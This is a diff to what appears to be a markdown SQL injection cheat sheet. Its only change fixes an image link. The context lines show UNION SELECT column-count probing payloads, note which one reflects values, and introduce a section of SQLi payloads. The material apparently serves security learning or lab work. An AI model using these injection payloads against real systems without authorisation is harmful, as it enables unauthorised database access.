@@ -11,7 +11,7 @@
 #### `' UNION SELECT 1 -- -` No values
 #### `' UNION SELECT 1,2 -- -` No values
 #### `' UNION SELECT 1,2,3 -- -` Values are reflected!
-![alt-text](https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FsixO74ZQmWWjbatdV7WQ%2Fuploads%2FiMA8il58YnoiSfSBNhwv%2FBURPCOOKIESQL.jpg?alt=media&token=ca2f7673-855a-4e73-9e13-626d989795d6 ")
+![alt-text](https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FsixO74ZQmWWjbatdV7WQ%2Fuploads%2FiMA8il58YnoiSfSBNhwv%2FBURPCOOKIESQL.jpg?alt=media&token=ca2f7673-855a-4e73-9e13-626d989795d6)
 
 ### SQLi payloads:
 ##### Find current database:
